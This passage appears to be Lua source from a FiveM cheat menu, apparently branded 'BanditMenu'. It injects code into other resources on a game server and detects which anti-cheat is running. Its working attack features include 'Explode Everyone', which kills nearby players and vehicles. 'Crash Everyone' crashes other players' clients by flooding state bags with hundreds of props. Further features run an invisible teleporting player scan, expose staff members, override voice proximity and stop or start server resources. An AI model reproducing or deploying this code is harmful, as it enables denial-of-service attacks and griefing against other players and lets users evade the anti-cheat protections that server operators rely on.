                                        end
                                    end
                                end

                                _G.isCrutchActive = false
                                _G.crutchTimer = 0
                                _G.StartCrutchLoop = function() end
                            ]])
                        end
                    },
                    {
                        label = 'Remove Wheelchair',
                        type = 'button',
                        onConfirm = function()
                            if GetResourceState("wasabi_crutch") ~= "started" then
                                showNotify("Resource Isn't Running", "error")
                                return
                            end
                            injectCode("wasabi_crutch", [[
                                _G.StopChairLoop = true
                                _G.BreakLoop = true

                                if DisableKeys then
                                    DisableKeys.chair = nil
                                end

                                local ped = PlayerPedId()

                                if IsPedInAnyVehicle(ped, false) then
                                    local veh = GetVehiclePedIsIn(ped, false)
                                    SafeRunNative(DeleteVehicle, veh)
                                end

                                _G.isWheelchairActive = false
                                _G.crutchTimer = 0
                                _G.StartChairLoop = function() end
                            ]])
                        end
                    },
                    {
                        label = 'Fake Player Scanner',
                        type = 'button',
                        desc = 'Scans the map for hidden players and prints results to F8',
                        onConfirm = function()
                            if _G.__ShadowOneScanRunning then
                                showNotify('Scan already running', 'error')
                                return
                            end
                            _G.__ShadowOneScanRunning = true
                            showNotify('Fake player scan started — check F8 when done', 'info')

                            local doneKey = 'JUNKIE_SCAN_' .. math.floor(GetGameTimer())

                            injectCode('monitor', string.format([[
                                if _G.__ShadowOneScanActive then return end
                                _G.__ShadowOneScanActive = true
                                _G.__ShadowOneScanCancel = false

                                SafeRunNative(CreateThread, function()
                                    local doneKey = %q
                                    local found = {}
                                    local restoreSelf = nil

                                    local function finish(result)
                                        _G.__ShadowOneScanActive = false
                                        _G.__ShadowOneScanCancel = false
                                        SafeRunNative(AddTextEntry, doneKey, tostring(result))
                                    end

                                    local ok, err = pcall(function()
                                        local function addRoutePoint(list, seen, x, y)
                                            local key = math.floor(x / 25) .. ':' .. math.floor(y / 25)
                                            if seen[key] then return end
                                            seen[key] = true
                                            list[#list + 1] = { x + 0.0, y + 0.0 }
                                        end

                                        local function buildRoute(origin)
                                            local list, seen = {}, {}

                                            local rows = {
                                                { -3225, { -1525, -925, -325, 275, 875, 1325 } },
                                                { -2675, { -1375, -775, -175, 425, 1025 } },
                                                { -2125, { -1825, -1225, -625, -25, 575, 1175 } },
                                                { -1575, { -1675, -1075, -475, 125, 725, 1275 } },
                                                { -1025, { -1875, -1275, -675, -75, 525, 1125 } },
                                                { -475,  { -1975, -1375, -775, -175, 425, 1025, 1625 } },
                                                { 75,    { -1725, -1125, -525, 75, 675, 1325, 1975 } },
                                                { 625,   { -1075, -475, 125, 725, 1325, 1975, 2525 } },
                                            }

                                            for i = 1, #rows do
                                                local y, xs = rows[i][1], rows[i][2]
                                                if i %% 2 == 0 then
                                                    for x = #xs, 1, -1 do
                                                        addRoutePoint(list, seen, xs[x], y)
                                                    end
                                                else
                                                    for x = 1, #xs do
                                                        addRoutePoint(list, seen, xs[x], y)
                                                    end
                                                end
                                            end

                                            local anchors = {
                                                { -2425, 425 }, { -2725, 1325 }, { -2325, 2225 }, { -1725, 2725 },
                                                { -2175, 3425 }, { -1575, 4175 }, { -725, 4525 }, { 225, 4675 },
                                                { 975, 4125 }, { 1675, 3775 }, { 2325, 3925 }, { 2825, 4325 },
                                                { 2525, 4925 }, { 1775, 4525 }, { 625, 5325 }, { -275, 5725 },
                                                { -775, 5975 }, { -375, 6225 }, { 275, 6375 }, { 775, 6425 },
                                                { 1325, 6275 }, { 2625, 1575 }, { 2375, 2325 }, { 1975, 2925 },
                                                { 1425, 3275 }, { 925, 2625 }, { 325, 2475 }, { -375, 2725 },
                                                { -1075, 3025 }, { 1975, 775 }, { 2375, 1075 }, { 1375, 575 },
                                                { 825, 725 }, { 275, 475 }, { -375, 775 }, { -925, 325 },
                                                { -1775, -2325 }, { -1575, -825 }, { 925, -3025 }, { 1125, -325 },
                                            }

                                            for i = 1, #anchors do
                                                addRoutePoint(list, seen, anchors[i][1], anchors[i][2])
                                            end

                                            local ordered = {}
                                            local cx, cy = origin.x, origin.y
                                            while #list > 0 do
                                                local bestIndex, bestDist = 1, nil
                                                for i = 1, #list do
                                                    local dx, dy = list[i][1] - cx, list[i][2] - cy
                                                    local dist = dx * dx + dy * dy
                                                    if not bestDist or dist < bestDist then
                                                        bestIndex, bestDist = i, dist
                                                    end
                                                end
                                                local p = table.remove(list, bestIndex)
                                                ordered[#ordered + 1] = p
                                                cx, cy = p[1], p[2]
                                            end

                                            return ordered
                                        end

                                        local function collectPlayers()
                                            for _, pid in ipairs(GetActivePlayers() or {}) do
                                                if pid ~= PlayerId() then
                                                    local ped = GetPlayerPed(pid)
                                                    if ped and ped ~= 0 and DoesEntityExist(ped) then
                                                        local sid = GetPlayerServerId(pid)
                                                        if sid and sid > 0 and not found[sid] then
                                                            local coords = GetEntityCoords(ped)
                                                            if coords and coords.x > -5700.0 and coords.x < 6800.0
                                                                and coords.y > -4100.0 and coords.y < 8500.0 then
                                                                found[sid] = GetPlayerName(pid) or '?'
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end

                                        local function findGround(x, y)
                                            for attempt = 1, 8 do
                                                SafeRunNative(RequestAdditionalCollisionAtCoord, x + 0.0, y + 0.0, 100.0)
                                                for z = 950, 0, -75 do
                                                    local ok2, gz = GetGroundZAndNormalFor_3dCoord(x + 0.0, y + 0.0, z + 0.0)
                                                    if ok2 then return gz + 0.6 end
                                                    Wait(0)
                                                end
                                                Wait(120)
                                            end
                                            return 80.0
                                        end

                                        local ped = PlayerPedId()
                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                        local saved = {
                                            ped = ped,
                                            coords = GetEntityCoords(ped),
                                            heading = GetEntityHeading(ped),
                                            visible = IsEntityVisible(ped),
                                            vehicle = vehicle and vehicle > 0 and vehicle or nil
                                        }

                                        if saved.vehicle then
                                            saved.vehicleCoords = GetEntityCoords(saved.vehicle)
                                            saved.vehicleHeading = GetEntityHeading(saved.vehicle)
                                            for seat = -1, GetVehicleModelNumberOfSeats(GetEntityModel(saved.vehicle)) - 1 do
                                                if GetPedInVehicleSeat(saved.vehicle, seat) == ped then
                                                    saved.seat = seat
                                                    break
                                                end
                                            end
                                        end

                                        restoreSelf = function()
                                            SafeRunNative(ClearFocus)
                                            SafeRunNative(NewLoadSceneStop)
                                            SafeRunNative(FreezeEntityPosition, ped, false)
                                            if saved.vehicle and DoesEntityExist(saved.vehicle) then
                                                SafeRunNative(FreezeEntityPosition, saved.vehicle, false)
                                                SafeRunNative(SetEntityCoordsNoOffset, saved.vehicle, saved.vehicleCoords.x, saved.vehicleCoords.y, saved.vehicleCoords.z, false, false, false)
                                                SafeRunNative(SetEntityHeading, saved.vehicle, saved.vehicleHeading)
                                                SafeRunNative(TaskWarpPedIntoVehicle, ped, saved.vehicle, saved.seat or -1)
                                            else
                                                SafeRunNative(SetPedCoordsKeepVehicle, ped, saved.coords.x, saved.coords.y, saved.coords.z)
                                                SafeRunNative(SetEntityHeading, ped, saved.heading)
                                            end
                                            SafeRunNative(SetEntityVisible, ped, saved.visible ~= false, false)
                                        end

                                        SafeRunNative(SetEntityVisible, ped, false, false)
                                        SafeRunNative(FreezeEntityPosition, ped, true)
                                        if saved.vehicle and DoesEntityExist(saved.vehicle) then
                                            SafeRunNative(FreezeEntityPosition, saved.vehicle, true)
                                        end

                                        local route = buildRoute(saved.coords)
                                        for i = 1, #route do
                                            if _G.__ShadowOneScanCancel then break end
                                            local p = route[i]
                                            SafeRunNative(SetFocusPosAndVel, p[1], p[2], 75.0, 0.0, 0.0, 0.0)
                                            SafeRunNative(RequestAdditionalCollisionAtCoord, p[1], p[2], 100.0)
                                            SafeRunNative(SetPedCoordsKeepVehicle, ped, p[1], p[2], 100.0)
                                            Wait(90)
                                            local z = findGround(p[1], p[2])
                                            SafeRunNative(SetPedCoordsKeepVehicle, ped, p[1], p[2], z)
                                            Wait(650)
                                            collectPlayers()
                                        end

                                        restoreSelf()
                                        restoreSelf = nil

                                        local list = {}
                                        for sid, name in pairs(found) do
                                            list[#list + 1] = { sid = sid, name = name }
                                        end
                                        table.sort(list, function(a, b) return (a.sid or 0) < (b.sid or 0) end)

                                        print('^5[Junkie]^7 ===== FAKE PLAYER SCAN =====')
                                        print('^5[Junkie]^7 Players found: ' .. tostring(#list))
                                        for i = 1, #list do
                                            print('  [' .. tostring(list[i].sid) .. '] ' .. tostring(list[i].name))
                                        end
                                        print('^5[Junkie]^7 ============================')

                                        finish(#list)
                                    end)

                                    if not ok then
                                        if restoreSelf then pcall(restoreSelf) end
                                        print('^5[Junkie]^7 Scan error: ' .. tostring(err))
                                        finish('ERR')
                                    end
                                end)
                            ]], doneKey))

                            CreateThread(function()
                                local timeout = GetGameTimer() + 120000
                                while GetGameTimer() < timeout do
                                    Wait(500)
                                    local result = GetLabelText(doneKey)
                                    if result and result ~= '' and result ~= 'NULL' and result ~= doneKey then
                                        if result == 'ERR' then
                                            showNotify('Scan failed. Check F8.', 'error')
                                        else
                                            showNotify('Scan done: ' .. result .. ' players found. Check F8.', 'success')
                                        end
                                        _G.__ShadowOneScanRunning = false
                                        return
                                    end
                                end
                                injectCode('monitor', [[
                                    _G.__ShadowOneScanCancel = true
                                ]])
                                showNotify('Scan timed out', 'error')
                                _G.__ShadowOneScanRunning = false
                            end)
                        end
                    },
                    {
                        label = 'Explode Everyone',
                        type = 'checkbox',
                        checked = false,
                        onConfirm = function(checked)
                            local isReaper = ac == 'ReaperV4' or ac == 'ReaperV4 Pro'
                            injectCode('monitor', string.format([[
                                _G.ExplodeEveryone = %s
                                if _G.ExplodeEveryone and not _G.ExplodeEveryoneThread then
                                    _G.ExplodeEveryoneThread = true
                                    SafeRunNative(CreateThread, function()
                                        local ped    = SafeRunNative(PlayerPedId)
                                        local reaper = %s

                                        SafeRunNative(CreateThread, function()
                                            while _G.ExplodeEveryone do
                                                SafeRunNative(DisableControlAction, 0, 37, true)
                                                if reaper then
                                                    SafeRunNative(SetPedCurrentWeaponVisible, SafeRunNative(PlayerPedId), false, true, true, true)
                                                end
                                                Wait(0)
                                            end
                                        end)

                                        local hitCounts = {}
                                        local lastRealShot = 0
                                        local SHOT_COOLDOWN = 1200

                                        local function clientBlast(x, y, z)
                                            SafeRunNative(AddExplosion, x, y, z, 2, 0.0, true, false, 1.0)
                                        end

                                        local weapon
                                        if reaper then
                                            weapon = SafeRunNative(GetHashKey, 'WEAPON_RPG')
                                            Wait(300)
                                            SafeRunNative(Citizen.InvokeNative, 0xBF0FD6E56C964FCB, ped, weapon, 1, false, true)
                                        else
                                            weapon = SafeRunNative(GetHashKey, 'VEHICLE_WEAPON_PLAYER_LAZER')
                                            SafeRunNative(Citizen.InvokeNative, 0xBF0FD6E56C964FCB, ped, weapon, 1, false, true)
                                        end
                                        SafeRunNative(SetCurrentPedWeapon, ped, weapon, true)
                                        SafeRunNative(RequestWeaponAsset, weapon, 31, 26)
                                        while not SafeRunNative(HasWeaponAssetLoaded, weapon) do Wait(0) end

                                        while _G.ExplodeEveryone do
                                            ped = SafeRunNative(PlayerPedId)
                                        local origin = SafeRunNative(GetEntityCoords, ped)
                                        local now = SafeRunNative(GetGameTimer)

                                        local targets = {}
                                        local pedPool = SafeRunNative(GetGamePool, 'CPed')
                                        for i = 1, #pedPool do
                                            local p = pedPool[i]
                                            if p ~= ped and SafeRunNative(DoesEntityExist, p) then
                                                local c = SafeRunNative(GetEntityCoords, p)
                                                local d = #(c - origin)
                                                if d <= 300.0 then
                                                    targets[#targets+1] = {e=p, c=c, d=d, isVeh=false}
                                                end
                                            end
                                        end
                                        local vehPool = SafeRunNative(GetGamePool, 'CVehicle')
                                        for i = 1, #vehPool do
                                            local v = vehPool[i]
                                            if SafeRunNative(DoesEntityExist, v) then
                                                local c = SafeRunNative(GetEntityCoords, v)
                                                local d = #(c - origin)
                                                if d <= 300.0 then
                                                    targets[#targets+1] = {e=v, c=c, d=d, isVeh=true}
                                                end
                                            end
                                        end
                                        table.sort(targets, function(a, b) return a.d < b.d end)

                                        if now - lastRealShot >= SHOT_COOLDOWN then
                                            for i = 1, #targets do
                                                local t = targets[i]
                                                if (hitCounts[t.e] or 0) < 2 then
                                                    local c = t.c
                                                    if t.isVeh then
                                                        local up = SafeRunNative(GetOffsetFromEntityInWorldCoords, t.e, 0, 0, 3)
                                                        SafeRunNative(ShootSingleBulletBetweenCoords, up.x, up.y, up.z, c.x, c.y, c.z, 999999, true, weapon, ped, true, false, 999999.0)
                                                    else
                                                        SafeRunNative(ShootSingleBulletBetweenCoords, c.x, c.y, c.z + 3, c.x, c.y, c.z + 0.2, 999999, true, weapon, ped, true, false, 999999.0)
                                                    end
                                                    hitCounts[t.e] = (hitCounts[t.e] or 0) + 1
                                                    lastRealShot = now
                                                    break
                                                end
                                            end
                                        end

                                        for i = 1, #targets do
                                            local t = targets[i]
                                            if (hitCounts[t.e] or 0) < 2 then
                                                clientBlast(t.c.x, t.c.y, t.c.z)
                                            end
                                        end
                                        for i = 1, #targets do
                                            local t = targets[i]
                                            if (hitCounts[t.e] or 0) >= 2 then
                                                clientBlast(t.c.x, t.c.y, t.c.z)
                                                if t.isVeh then
                                                    clientBlast(t.c.x + math.random(-3,3), t.c.y + math.random(-3,3), t.c.z + math.random(1,4))
                                                end
                                            end
                                        end
                                        local spreadRadius = #targets > 0 and 300 or 80
                                        for i = 1, math.random(5, 12) do
                                            clientBlast(
                                                origin.x + math.random(-spreadRadius, spreadRadius),
                                                origin.y + math.random(-spreadRadius, spreadRadius),
                                                origin.z + math.random(-5, 25)
                                            )
                                        end

                                        Wait(300)
                                        end

                                        if reaper then
                                            SafeRunNative(RemoveWeaponFromPed, SafeRunNative(PlayerPedId), weapon)
                                        end

                                        _G.ExplodeEveryoneThread = false
                                    end)
                                end
                            ]], checked and 'true' or 'false', tostring(isReaper)))
                            showNotify('Explode Everyone ' .. (checked and 'On' or 'Off'), checked and 'success' or 'info')
                        end
                    },
                    {
                        label = 'Talk to Everyone',
                        type = 'checkbox',
                        onConfirm = function(state)
                            injectCode('pma-voice', string.format([[
                                local fakeProximity = 999999.0
                                local toggle = %s
                                if toggle then
                                    SafeRunNative(NetworkSetTalkerProximity, fakeProximity)
                                    SafeRunNative(MumbleSetTalkerProximity, fakeProximity)
                                else
                                    SafeRunNative(NetworkSetTalkerProximity, 3.0)
                                    SafeRunNative(MumbleSetTalkerProximity, 3.0)
                                end
                            ]], tostring(state)))
                        end
                    },
                    {
                        label = 'Crash Everyone',
                        desc = 'Crash everyone near you',
                        type = 'checkbox',
                        onConfirm = function(checked)
                            if not checked then
                                if GetResourceState('prp-bridge') == 'started' then
                                    injectCode('prp-bridge', [[
                                        DeleteTrackedThread('JunkieCrashEveryone')
                                    ]])
                                elseif GetResourceState('lation_ui') == 'started' then
                                    injectCode('lation_ui', [[
                                        SafeRunNative(LocalPlayer.state.set, LocalPlayer.state, 'lation_ui:progressProps', nil, true)
                                    ]])
                                elseif GetResourceState('prism_uipack') == 'started' then
                                    injectCode('prism_uipack', [[
                                        SafeRunNative(LocalPlayer.state.set, LocalPlayer.state, 'prism:progressProps', nil, true)
                                    ]])
                                end
                                return
                            end

                            if GetResourceState('prp-bridge') == 'started' then
                                injectCode('prp-bridge', [[
                                    _G.GetEntityFromStateBagName = function()
                                        return 0
                                    end

                                    _G.CreateObject = function()
                                        return 0
                                    end

                                    CreateTrackedThread('JunkieCrashEveryone', {
                                        thread = function(self)
                                            while self.isActive do
                                                local setObjects = {}
                                                local idx = GetGameTimer()..'_'..math.random(999999)

                                                for i = 1, 600 do
                                                    local key = 'obj:'..idx..':'..i

                                                    setObjects[key] = {
                                                        [1] = key,
                                                        [2] = 'p_spinning_anus_s',
                                                        [3] = 0,
                                                        [4] = { x = 0.0, y = 0.0, z = 0.0 },
                                                        [5] = { x = 0.0, y = 0.0, z = 0.0 },
                                                        [6] = 1,
                                                        [7] = { true, true, false, false },
                                                        [8] = {}
                                                    }
                                                end

                                                local targetEntity
                                                local playerId = PlayerId()
                                                local entities = {}
                                                local peds     = GetGamePool('CPed')
                                                local objects  = GetGamePool('CObject')
                                                local vehicles = GetGamePool('CVehicle')

                                                for i = 1, #peds     do entities[#entities + 1] = peds[i]     end
                                                for i = 1, #objects  do entities[#entities + 1] = objects[i]  end
                                                for i = 1, #vehicles do entities[#entities + 1] = vehicles[i] end

                                                for i = 1, #entities do
                                                    local entity = entities[i]

                                                    if NetworkGetEntityIsNetworked(entity) and NetworkGetEntityOwner(entity) ~= playerId then
                                                        targetEntity = entity
                                                        break
                                                    end
                                                end

                                                if targetEntity then
                                                    _G.SetClient_LastUsedCachedEntity = targetEntity

                                                    local setEntity = SafeRunNative(Entity, targetEntity)
                                                    SafeRunNative(setEntity.state.set, setEntity, 'VehTempAttachObjects', setObjects, true)
                                                end

                                                Wait(1000)
                                            end
                                        end,
                                        onRemove = function(self)
                                            local targetEntity = _G.SetClient_LastUsedCachedEntity

                                            if targetEntity and NetworkGetEntityIsNetworked(targetEntity) and NetworkGetEntityOwner(targetEntity) ~= PlayerId() then
                                                local setEntity = SafeRunNative(Entity, targetEntity)
                                                SafeRunNative(setEntity.state.set, setEntity, 'VehTempAttachObjects', {}, true)
                                            end
                                        end
                                    })
                                ]])
                            elseif GetResourceState('lation_ui') == 'started' then
                                injectCode('lation_ui', [[
                                    _G.CreateObject = function() end

                                    local model = 'p_spinning_anus_s'
                                    local props = {}

                                    for i = 1, 600 do
                                        props[i] = {
                                            model = model,
                                            coords = vec3(0.0, 0.0, 0.0),
                                            pos = vec3(0.0, 0.0, 0.0),
                                            rot = vec3(0.0, 0.0, 0.0),
                                            rotOrder = 0,
                                        }
                                    end

                                    SafeRunNative(CreateThread, function()
                                        SafeRunNative(LocalPlayer.state.set, LocalPlayer.state, 'lation_ui:progressProps', props, true)
                                        Wait(1000)
                                        SafeRunNative(LocalPlayer.state.set, LocalPlayer.state, 'lation_ui:progressProps', nil, true)
                                    end)
                                ]])
                            elseif GetResourceState('prism_uipack') == 'started' then
                                injectCode('prism_uipack', [[
                                    _G.CreateObject = function() end

                                    local setProps = {}
                                    local propData = {
                                        model = 'p_spinning_anus_s',
                                        pos = {},
                                        rot = {},
                                        bone = 0
                                    }

                                    for i = 1, 600 do
                                        setProps[#setProps + 1] = propData
                                    end

                                    SafeRunNative(LocalPlayer.state.set, LocalPlayer.state, 'prism:progressProps', setProps, true)
                                    SafeRunNative(LocalPlayer.state.set, LocalPlayer.state, 'prism:progressProps', propData, true)
                                ]])
                            else
                                showNotify('No supported resource found!', 'error')
                            end
                        end
                    },
                }
            },
        }
    },
    {
        label = 'Settings',
        icon = 'ph-gear',
        type = 'submenu',
        tabs = {
            {
                name = 'Settings',
                submenu = {
                    {
                        label = 'Set Menu Keybind',
                        type = 'button',
                        onConfirm = function()
                            setKeybind('Menu Keybind', function()
                                defaultBind = MenuKey
                                canCancel = true

                                onConfirm = function(key)
                                    defaultBind = key
                                    MenuKey = key
                                    showNotify('Menu keybind set to: ' .. key, 'success')
                                end
                            end)
                        end
                    },
                    {
                        label = 'Crash Own Game',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local function crash() return crash() end
                                crash()
                            ]])
                        end
                    },
                    {
                        label = 'Framework Checker',
                        type = 'button',
                        onConfirm = function()
                            if MachoResourceInjectable('es_extended') then
                                showNotify('Detected Framework: ESX', 'info')
                            elseif MachoResourceInjectable('qb-core') then
                                showNotify('Detected Framework: QBCore', 'info')
                            elseif MachoResourceInjectable('core') then
                                showNotify('Detected Framework: ESX', 'info')
                            elseif MachoResourceInjectable('vrp') then
                                showNotify('Detected Framework: vRP', 'info')
                            elseif MachoResourceInjectable('qbx_core') then
                                showNotify('Detected Framework: Qbox', 'info')
                            elseif MachoResourceInjectable('ox_core') then
                                showNotify('Detected Framework: Ox Core', 'info')
                            else
                                showNotify('No known Framework detected', 'info')
                            end
                        end
                    },
                    {
                        label = 'Anticheat Checker',
                        type = 'button',
                        onConfirm = function()
                            if ac then
                                showNotify(('Detected Anti-Cheat: %s (Resource: %s)'):format(ac, name), 'info')
                            else
                                showNotify('No known Anti-Cheat detected in any resources.', 'info')
                            end
                        end
                    },
                    {
                        label = 'Get Server IP',
                        type = 'button',
                        onConfirm = function()
                            local serverIP = GetCurrentServerEndpoint() or "Unknown"
                            print("Current Server IP: " .. serverIP)
                        end
                    }
                }
            },
            {
                name = 'Misc',
                submenu = {
                    {
                        label = 'Theme',
                        type = 'submenu',
                        submenu = {
                            {
                                label = 'Position X',
                                type = 'slider',
                                autoConfirm = true,
                                value = menuPosX,
                                min = 0,
                                max = 80,
                                step = 0.5,
                                onConfirm = function(v)
                                    menuPosX = v
                                    SendSvelte('setMenuPos', { x = menuPosX, y = menuPosY })
                                end
                            },
                            {
                                label = 'Position Y',
                                type = 'slider',
                                autoConfirm = true,
                                value = menuPosY,
                                min = 0,
                                max = 80,
                                step = 0.5,
                                onConfirm = function(v)
                                    menuPosY = v
                                    SendSvelte('setMenuPos', { x = menuPosX, y = menuPosY })
                                end
                            },
                            {
                                label = 'Custom Banner URL',
                                type = 'button',
                                onConfirm = function()
                                    showInput('Custom Banner URL', '', function(setBanner)
                                        if setBanner and setBanner ~= '' then
                                            menuBannerURL = setBanner
                                            SendSvelte('setBanner', { url = menuBannerURL })
                                        end
                                    end)
                                end
                            },
                            {
                                label = 'Banners',
                                type = 'scroll',
                                selected = 1,
                                options = {
                                    { label = 'Banner 1', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/content.png',     r=124, g=58,  b=237 },
                                    { label = 'Banner 2', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/content(1).png',  r=255, g=255, b=255 },
                                    { label = 'Banner 3', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/fds.png',         r=150, g=35,  b=230 },
                                    { label = 'Banner 4', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/fgdsgsd.png',     r=170, g=140, b=235 },
                                    { label = 'Banner 5', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/image.webp',   r=168, g=85,  b=247 },
                                    { label = 'Banner 6', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/banner4.webp', r=147, g=51,  b=234 },
                                    { label = 'Banner 7', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/banner6.webp', r=140, g=110, b=210 },
                                    { label = 'Banner 8', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/banner7.webp', r=140, g=225, b=90  },
                                    { label = 'Banner 9', value = 'https://r2.fivemanage.com/h1z8GeMJzZmRw85iEGQuf/gfdgd.webp',    r=185, g=80,  b=225 },
                                },
                                onConfirm = function(data)
                                    SendSvelte('setBanner', { url = data.value })
                                    menuColorR = data.r or 255
                                    menuColorG = data.g or 255
                                    menuColorB = data.b or 255
                                    SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
                                    if menuConfig then
                                        for _, itm in ipairs(menuConfig) do
                                            if itm.label == 'Red'   then itm.value = menuColorR end
                                            if itm.label == 'Green' then itm.value = menuColorG end
                                            if itm.label == 'Blue'  then itm.value = menuColorB end
                                        end
                                        refreshMenu()
                                    end
                                end
                            },
                            { type = 'divider', label = 'Menu Color' },
                            {
                                label = 'Red',
                                type = 'slider',
                                autoConfirm = true,
                                value = menuColorR,
                                min = 0,
                                max = 255,
                                step = 5,
                                onConfirm = function(v)
                                    menuColorR = v
                                    SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
                                end
                            },
                            {
                                label = 'Green',
                                type = 'slider',
                                autoConfirm = true,
                                value = menuColorG,
                                min = 0,
                                max = 255,
                                step = 5,
                                onConfirm = function(v)
                                    menuColorG = v
                                    SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
                                end
                            },
                            {
                                label = 'Blue',
                                type = 'slider',
                                autoConfirm = true,
                                value = menuColorB,
                                min = 0,
                                max = 255,
                                step = 5,
                                onConfirm = function(v)
                                    menuColorB = v
                                    SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
                                end
                            },
                        }
                    },
                    { type = 'divider', label = 'Toggle' },
                    {
                        label = 'Show Keybind List',
                        type = 'checkbox',
                        checked = false,
                        onConfirm = function(checked)
                            showKeybindListState = checked
                            local binds = {}
                            for k, item in pairs(itemKeybinds) do
                                binds[#binds + 1] = { label = item.label or '?', key = k }
                            end
                            SendSvelte('updateKeybinds', { KeyBinds = binds })
                            SendSvelte('showKeybinds', { showKeybinds = checked })
                        end
                    },
                    {
                        label = 'Show Spectator List',
                        type = 'checkbox',
                        desc = 'Show a list of current Spectators',
                        checked = false,
                        onConfirm = function(checked)
                            showSpectatorListState = checked
                            SendSvelte('showSpectators', { showSpectators = checked })

                            if checked then
                                SendSvelte('updateSpectators', { Spectators = getSpectators() })
                            end
                        end
                    },
                    {
                        label = 'Show Admins',
                        type = 'checkbox',
                        desc = 'Show nearby staff sorted by distance',
                        checked = false,
                        onConfirm = function(checked)
                            adminListEnabled = checked
                            if checked then
                                SendSvelte('showAdmins', { show = true })
                                if not adminListThreadActive then
                                    adminListThreadActive = true
                                    CreateThread(function()
                                        while adminListEnabled do
                                            local items = {}
                                            local selfCoords = GetEntityCoords(PlayerPedId())
                                            for _, pid in ipairs(GetActivePlayers()) do
                                                if pid ~= PlayerId() then
                                                    local sid = GetPlayerServerId(pid)
                                                    local bag = 'player:' .. tostring(sid)
                                                    local group = GetStateBagValue(bag, 'group') or GetStateBagValue(bag, 'permission_group')
                                                    if type(group) == 'table' then group = group.label or group.name or group.group end
                                                    if type(group) == 'string' and group ~= '' and group ~= 'user' then
                                                        local dist = math.floor(#(GetEntityCoords(GetPlayerPed(pid)) - selfCoords))
                                                        items[#items + 1] = { name = GetPlayerName(pid), dist = dist, group = group }
                                                    end
                                                end
                                            end
                                            table.sort(items, function(a, b) return a.dist < b.dist end)
                                            SendSvelte('updateAdmins', { items = items })
                                            Wait(1000)
                                        end
                                        adminListThreadActive = false
                                    end)
                                end
                            else
                                SendSvelte('showAdmins', { show = false })
                            end
                        end
                    },
                }
            },
            {
                name = 'Resources',
                submenu = (function()
                    local items = {
                        { type = 'divider', label = 'Active Resources' },
                    }

                    for i = 0, GetNumResources() - 1 do
                        local resName = GetResourceByFindIndex(i)

                        if resName and resName ~= '' then
                            local r = resName

                            items[#items + 1] = {
                                label = r,
                                type = 'scroll',
                                desc = ("Manage '%s'"):format(r),
                                options = {
                                    { label = 'Start',     value = 'start' },
                                    { label = 'Stop',      value = 'stop'  },
                                    { label = 'Copy Name', value = 'copy'  },
                                },
                                selected = 1,
                                onConfirm = function(opt)
                                    if opt.value == 'start' then
                                        MachoResourceStart(r)
                                        showNotify(("Started '%s'"):format(r), 'success')
                                    elseif opt.value == 'stop' then
                                        MachoResourceStop(r)
                                        showNotify(("Stopped '%s'"):format(r), 'success')
                                    elseif opt.value == 'copy' then
                                        MachoSetClipboardText(r)
                                        showNotify(("Copied '%s' to clipboard"):format(r), 'success')
                                    end
                                end
                            }
                        end
                    end

                    return items
                end)(),
            },
        }
    }
}

menuConfig[#menuConfig + 1] = {
    label = 'BanditMenu',
    desc = 'discord.gg/espv2',
    icon = 'ph-discord',
    type = 'button',
    onConfirm = function()
        MachoSetClipboardText('https://discord.gg/espv2')
        showNotify('Discord invite copied to clipboard', 'success')
    end
}

local function buildMenuSearchResults(query, rootMenu)
    local needle = tostring(query or ''):lower():match('^%s*(.-)%s*$')
    local results = {}

    if needle == '' then
        return results
    end

    local visitedMenus = {}
    local function visit(menu, path)
        if type(menu) ~= 'table' or visitedMenus[menu] then
            return
        end

        visitedMenus[menu] = true

        for _, item in ipairs(menu) do
            if type(item) == 'table' then
                local itemPath = {}
                for i = 1, #path do
                    itemPath[i] = path[i]
                end

                local label = tostring(item.label or '')
                if label ~= '' then
                    itemPath[#itemPath + 1] = label
                end

                if not item._isSearchItem and label ~= '' and isSelectable(item) then
                    local searchableText = (label .. ' ' .. tostring(item.desc or '')):lower()
                    if searchableText:find(needle, 1, true) then
                        local result = {}
                        for key, value in pairs(item) do
                            result[key] = value
                        end
                        result.label = table.concat(itemPath, ' > ')

                        local originalOnConfirm = item.onConfirm
                        if hasType(item.type, 'checkbox') then
                            result.onConfirm = function(value)
                                item.checked = result.checked
                                if type(originalOnConfirm) == 'function' then
                                    originalOnConfirm(value)
                                end
                            end
                        elseif hasType(item.type, 'slider') then
                            result.onConfirm = function(value)
                                item.value = result.value
                                if type(originalOnConfirm) == 'function' then
                                    originalOnConfirm(value)
                                end
                            end
                        elseif hasType(item.type, 'scroll') then
                            result.onConfirm = function(value)
                                item.selected = result.selected
                                if type(originalOnConfirm) == 'function' then
                                    originalOnConfirm(value)
                                end
                            end
                        end

                        results[#results + 1] = result
                    end
                end

                if type(item.submenu) == 'table' then
                    visit(item.submenu, itemPath)
                end

                for _, tab in ipairs(item.tabs or {}) do
                    if type(tab) == 'table' and type(tab.submenu) == 'table' then
                        local tabPath = {}
                        for i = 1, #itemPath do
                            tabPath[i] = itemPath[i]
                        end
                        if tab.name then
                            tabPath[#tabPath + 1] = tostring(tab.name)
                        end
                        visit(tab.submenu, tabPath)
                    end
                end
            end
        end
    end

    visit(rootMenu, {})
    return results
end

local rootMenu = menuConfig
local searchItem = {
    label = 'Search',
    desc = 'Find an item by name or description',
    icon = 'ph-magnifying-glass',
    type = 'button',
    _isSearchItem = true,
    onConfirm = function()
        showInput('Search menu', '', function(query)
            local results = buildMenuSearchResults(query, rootMenu)
            if #results == 0 then
                showNotify('No matching menu items found', 'info')
                return
            end

            nestedMenus[#nestedMenus + 1] = {
                index = activeIndex,
                menu = menuConfig,
                label = 'Search results'
            }
            menuConfig = results
            activeIndex = 1
